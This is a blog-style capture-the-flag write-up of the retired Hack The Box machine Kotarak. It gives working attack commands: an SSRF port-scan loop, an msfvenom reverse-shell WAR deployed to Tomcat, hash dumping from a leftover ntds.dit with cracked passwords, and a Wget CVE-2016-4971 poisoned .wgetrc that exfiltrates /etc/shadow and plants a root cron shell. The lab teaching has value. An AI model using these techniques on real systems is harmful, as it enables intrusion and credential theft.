---
layout: post
title: "The Server That Ran Your Errands"
subtitle: "HTB Kotarak, where you make the front desk dial its own private extensions, loot a forgotten pentest for someone else's password, and let an old wget fetch you root"
date: 2018-03-17 12:00:00 +0000
description: "A web page that fetches any URL you name becomes a phone in the building's lobby, and an outdated wget on a cron timer fetches the last door open."
image: /assets/og/the-server-that-ran-your-errands.png
tags: [hackthebox, writeup]
---

Kotarak is a box about errands. Every door on this machine is opened by getting something else to walk through it for you. A web page on a high port will fetch any URL you hand it, so you make it dial the building's own private extensions and read back the rooms you were never supposed to see. One of those rooms leaks a Tomcat password, and Tomcat will run any application you upload, so you upload one that calls home. On disk you find a box that already pentested somebody else, with the password database still sitting in the loot. And the final move is the purest of all. An old copy of wget on a timer reaches out for a file every two minutes, and you stand where the file should be and hand it a poisoned one. Nobody forces a single lock here. You just keep finding things that fetch on your behalf, and you keep being the address they fetch from.

```
        K O T A R A K
        =============
        :60000  url.php?path=   "name a url, i'll go get it"
                  you name 127.0.0.1, the rooms it hides
                        |
                        v
        an admin password falls out of an internal page.
        tomcat runs the app you mail it. you get a shell.

        in the attic: someone else's stolen password db.
        crack it, become atanas.

        then a tired old wget, every two minutes,
        reaches out for a file. you are the file.
                                            取
```

## 0x01 · the lobby and the private lines

`nmap -sC -sV` paints a short, lopsided picture. SSH where you expect it, a Tomcat stack in the middle, and one strange light burning up in the high ports.

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.2p2 Ubuntu
8009/tcp  open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp  open  http       Apache Tomcat 8.5.5
60000/tcp open  http       Apache httpd 2.4.18 ((Ubuntu))
```

Tomcat on 8080 is the obvious centerpiece, but its manager wants a password you do not have yet. The thing worth staring at is `60000`. That is not a port anyone assigns on purpose. It is a port someone forgot to take down. Browse it and you get a tiny page with a single field, a URL bar that fetches whatever address you type and prints the result. The page is proud of this. It thinks it is a convenience.

## 0x02 · the front desk that dials any extension

That little fetch box is a Server-Side Request Forgery, and SSRF is the whole personality of the box. The request is plain.

```
curl "http://10.10.10.55:60000/url.php?path=http://127.0.0.1:22"
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1
```

Read what just happened. You asked the server to go fetch `127.0.0.1:22`, its own SSH port, and it did, and it read the banner back to you. The `path` parameter is a phone in the building's lobby that will dial any extension you name, including the internal ones with no line to the street. Picture a hotel front desk that, when a stranger calls and says "ring room 412 for me," cheerfully connects the call. From the desk's point of view the request came from inside the building, so every door is unlocked. That is SSRF in one sentence. The machine trusts itself, and you are now speaking with the machine's voice.

So you make it dial every extension. A short loop walks all 65,535 internal ports and watches which ones answer.

```
for p in $(seq 1 65535); do
  echo -n "$p: "
  curl -s "http://10.10.10.55:60000/url.php?path=http://127.0.0.1:$p" | head -c 60
  echo
done
```

Two rooms that never faced the street light up. Port `320` shows a login form, and port `888` answers with a "Simple File Viewer," a page that reads files off the box and serves them by name.

## 0x03 · the password that was only ever supposed to be inside

The file viewer on 888 takes a `doc` parameter, and a thing that reads files by name is a thing you can aim. You reach it through the lobby phone, double-fetching: ask 60000 to ask 888 for a file.

```
http://10.10.10.55:60000/url.php?path=http://127.0.0.1:888/?doc=tomcat-users
```

What comes back is a Tomcat user database, the kind of file that should never leave the server's own disk, handed to you because the server fetched it for itself and you were listening.

```
<user username="admin" password="s3cret"
      roles="manager,manager-gui,admin-gui"/>
```

There is the credential the manager on 8080 wanted, `admin` and `s3cret`, sitting in a backup that was only ever readable from the inside. SSRF erased the word "inside."

## 0x04 · tomcat runs the app you mail it

A Tomcat manager with `manager-gui` rights is not a vulnerability so much as a feature pointed the wrong way. Its entire job is to accept a packaged web application, a WAR file, and run it. So you package one that does nothing but open a connection back to you, and you mail it in.

Think of a WAR as a microwave meal for the server. Tomcat's manager is the microwave, and it does not read the ingredients. It heats whatever box you slide in. Build the box with the standard kit and deploy it through the manager.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f war -o iceberg.war
curl -u admin:s3cret -T iceberg.war \
  "http://10.10.10.55:8080/manager/text/deploy?path=/iceberg"
```

The WAR carries `[ a jsp reverse shell dialing back to 10.10.14.4 on 443 ]`. Hit the deployed path once, the meal heats up, and a prompt lands in your listener as the `tomcat` service account.

```
nc -lvnp 443
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

## 0x05 · the attic full of someone else's loot

`tomcat` is a nobody account, so you go looking for what nobodies leave lying around. In the home tree sits an archive directory, and inside it the unmistakable shape of a finished penetration test against a different network entirely.

```
tomcat@kotarak-dmz:~$ ls to_archive/pentest_data/
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
```

Those two filenames are a confession. A `.dit` is `ntds.dit`, the entire Active Directory password database for a Windows domain, and the `.bin` beside it is the SYSTEM registry hive, which holds the key that unscrambles it. Whoever owned this box used it to crack someone else, then left the bodies in the attic. Impacket reads both and prints the hashes straight out.

```
secretsdump.py -ntds 333512.dit -system 089134.bin LOCAL
Administrator:500:...:e64fe0f24ba2489c05e64354d74ebd11:::
atanas:1108:...:2b576acbe6bcfda7294d6bd18041b8fe:::
```

Feed those NT hashes to a wordlist and two fall over fast. `Administrator` is `f16tomcat!`, and `atanas` is `Password123!`. The Administrator password is a Windows artifact from a dead engagement and a dead end here. But `atanas` is also a local user on this very Linux box, and a password is just a password to a login prompt that does not care where it was born.

```
tomcat@kotarak-dmz:~$ su atanas
Password: Password123!
atanas@kotarak-dmz:~$ cat user.txt
████████████████████████████████
```

## 0x06 · the errand boy on a timer

`atanas` is not root, and the box goes quiet for a moment. The tell is hiding in a place root accounts forget, a log file readable in `atanas`'s reach.

```
atanas@kotarak-dmz:~$ cat /root/app.log
10.0.3.133 - - [...] "GET /archive.tar.gz HTTP/1.1" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [...] "GET /archive.tar.gz HTTP/1.1" "Wget/1.16 (linux-gnu)"
```

Read the rhythm. Every two minutes, something at `10.0.3.133`, an internal container, runs `wget` to pull a file. And it is `Wget/1.16`, which is old enough to carry CVE-2016-4971. Here is the flaw, and it is beautiful. When that old wget asks for an HTTP file and the server answers with a redirect to an FTP location, wget writes the FTP file to disk using a filename the FTP server chooses. The fetcher lets the thing it is fetching from name the file and pick where it lands.

Think of it like sending a courier to pick up one specific envelope, and the sender hands them a different envelope plus a sticky note that reads "actually file this one in the boss's desk drawer." A careful courier refuses. This courier reads the note and files the envelope. So you become the server it fetches from. The cron job downloads to root's home directory, and the file you trick it into writing is `.wgetrc`, root's own wget config. Stand up a redirecting web server and an FTP server behind it.

```
# the http side answers the cron's request with a redirect to your ftp
[ python http handler that 301-redirects /archive.tar.gz to ftp://10.10.14.4/.wgetrc ]
# the ftp side that hands over the poisoned config
authbind python -m pyftpdlib -p 21 -w
```

The `.wgetrc` you serve tells the next run of wget to do two things, both as root. Post a sensitive file out, and write its download straight into the system cron directory.

```
post_file = /etc/shadow
output_document = /etc/cron.d/iceberg-root
```

On the following two-minute tick, root's wget reads your config, and now every fetch it makes writes a cron file as root. You fill that cron file with `[ a one-line root cron entry that dials a shell back to 10.10.14.4 on 443 ]`, wait one more cycle for the system to honor the new job, and the errand boy hands you the building.

```
nc -lvnp 443
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
████████████████████████████████
```

## 0x07 · the back stairs, for completeness

Kotarak leaves a second way up, and it is worth knowing because it needs no internet at all. Check `atanas`'s groups and you find membership in `disk`.

```
atanas@kotarak-dmz:~$ id
uid=1000(atanas) ... groups=...,6(disk)
```

The `disk` group is one of the quietest catastrophes in Linux. It hands you raw read and write on the block devices, the bare metal under the filesystem, beneath every permission the operating system pretends to enforce. Picture a bank where the vault has a careful guard at the door, and you have a key to the back wall. The guard is real. He is just standing in front of the wrong surface. With `debugfs` you open the raw device and walk the filesystem as though you were the kernel.

```
atanas@kotarak-dmz:~$ debugfs /dev/dm-0
debugfs:  cat /root/root.txt
████████████████████████████████
```

No exploit, no callback, no cron. You simply read the disk under the floor of the rules. Same flag, fetched a second way, which is very on brand for this box.

## 0x08 · the honest caveat

Nothing on Kotarak is a memory-corruption trick or a zero-day. Every step is a system being helpful to the wrong audience. SSRF is the spine of it, and SSRF is not going anywhere, because the entire modern cloud is built on servers fetching URLs for each other. The lobby phone that dialed `127.0.0.1` is the same flaw that, on a cloud host, dials the internal metadata address and reads back the keys to the whole account. The fix is never "block one address." It is teaching the fetcher to distrust the destination no matter who asks, because the request will always look like it came from inside.

The wget step is the one that should keep you up, because it inverts the instinct everyone has about who is dangerous. We picture the server we connect to as the risky party. Here the server was the victim and the thing it reached out to was the attacker. An outbound request is still a trust decision. Your client believes the answer, follows the redirect, writes the file, runs the config. A program that fetches is a program that can be fed, and old fetchers are the easiest mouths in the building. And the `disk` group is the footnote that ruins administrators, a permission that sounds like a chore assignment and is actually a master key to the bare metal. The operating system's whole rulebook lives on a surface the group can read straight through.

## 0x09 · outro

```
you named the address, and it went and fetched the room.
the attic still held the last victim's keys.
the old courier reached out on schedule,
        and you were standing where the file should have been.

nobody broke a lock. everything was handed over,
by a machine being helpful to the only voice it trusted: its own.

distrust the fetch. read your own outbound mail. wear black.

                                                            EOF
```

---

*HTB: Kotarak, retired 10 Mar 2018. A hard Linux box that is really a lecture on trusting your own requests, wearing an SSRF costume up front and an outdated wget in the back. The lobby phone still dials inward in a lab and nowhere you don't own.*